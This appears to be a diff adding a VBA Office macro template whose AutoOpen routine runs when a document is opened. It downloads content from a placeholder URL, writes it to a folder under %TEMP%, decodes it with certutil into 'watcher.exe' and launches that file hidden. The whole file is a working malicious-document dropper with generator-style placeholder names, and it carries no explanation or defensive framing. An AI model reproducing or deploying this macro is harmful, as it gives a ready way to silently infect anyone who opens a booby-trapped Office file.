@@ -1,0 +1,58 @@
+Sub AutoOpen()
+
+    Dim aVAR1a As Object
+    Dim aVAR2a As String
+    Dim aVAR3a As String
+    Dim aVAR4a As String
+    Dim aVAR5a As String
+
+    Set aVAR1a = CreateObject("Scripting.FileSystemObject")
+
+    aVAR2a = Environ("TEMP")
+    aVAR3a = aVAR2a & "\dataapi\tempapidata.txt"
+    aVAR4a = aVAR2a & "\dataapi\watcher.exe"
+    If Not aVAR1a.FolderExists(aVAR2a & "\dataapi") Then
+        MkDir (aVAR2a & "\dataapi")
+    End If
+
+    ApiFetchInfo = aFUNC1a("aPAYLOADa")
+    Open aVAR3a For Output As #1
+        Print #1, ApiFetchInfo
+    Close #1
+
+    aVAR5a = aFUNC2a("certutil -decode " & aVAR3a & " " & aVAR4a)
+    Call Shell(aVAR4a, vbHide)
+
+End Sub
+
+Function aFUNC1a(URL As String) As String
+    Dim aVAR2a As String
+
+    Dim HTML As String
+    With CreateObject("MSXML2.XMLHTTP")
+        .Open "GET", URL, False
+        .send
+        aFUNC1a = .responseText
+    End With
+End Function
+
+Public Function aFUNC2a(sCmd As String) As String
+
+    Dim oapicall As Object
+    Set oapicall = CreateObject("WScript.Shell")
+
+    Dim oExec As Object
+    Dim oOutput As Object
+    Set oExec = oapicall.Exec(sCmd)
+    Set oOutput = oExec.StdOut
+
+    Dim s As String
+    Dim sLine As String
+    While Not oOutput.AtEndOfStream
+        sLine = oOutput.ReadLine
+        If sLine <> "" Then s = s & sLine & vbCrLf
+    Wend
+
+    aFUNC2a = s
+
+End Function
